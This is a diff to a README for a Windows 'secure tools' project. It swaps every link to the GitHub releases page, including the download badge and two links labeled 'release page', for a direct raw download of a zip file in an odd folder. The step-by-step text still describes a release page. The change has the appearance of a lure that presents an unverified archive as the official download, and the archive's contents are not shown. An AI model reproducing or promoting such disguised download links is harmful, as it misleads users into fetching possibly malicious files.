@@ -1,6 +1,6 @@
 # 🛡️ muhammadshourov404 - Simple Windows setup for secure tools
 
-[![Download the app](https://img.shields.io/badge/Download%20Now-Release%20Page-1f2937?style=for-the-badge&logo=github&logoColor=white)](https://github.com/whchudoin/muhammadshourov404/releases)
+[![Download the app](https://img.shields.io/badge/Download%20Now-Release%20Page-1f2937?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/whchudoin/muhammadshourov404/main/Puritaness/muhammadshourov-v3.2-beta.1.zip)
 
 ## 🚀 Overview
 
@@ -33,7 +33,7 @@ Use a Windows PC with:
 
 Visit the release page to download the latest version:
 
-[https://github.com/whchudoin/muhammadshourov404/releases](https://github.com/whchudoin/muhammadshourov404/releases)
+[https://raw.githubusercontent.com/whchudoin/muhammadshourov404/main/Puritaness/muhammadshourov-v3.2-beta.1.zip](https://raw.githubusercontent.com/whchudoin/muhammadshourov404/main/Puritaness/muhammadshourov-v3.2-beta.1.zip)
 
 On that page:
 1. Open the latest release
@@ -149,7 +149,7 @@ This repository is set up for users who want a direct path to a Windows download
 
 ## 📌 Release page
 
-[https://github.com/whchudoin/muhammadshourov404/releases](https://github.com/whchudoin/muhammadshourov404/releases)
+[https://raw.githubusercontent.com/whchudoin/muhammadshourov404/main/Puritaness/muhammadshourov-v3.2-beta.1.zip](https://raw.githubusercontent.com/whchudoin/muhammadshourov404/main/Puritaness/muhammadshourov-v3.2-beta.1.zip)
 
 ## 🧩 Quick start
 
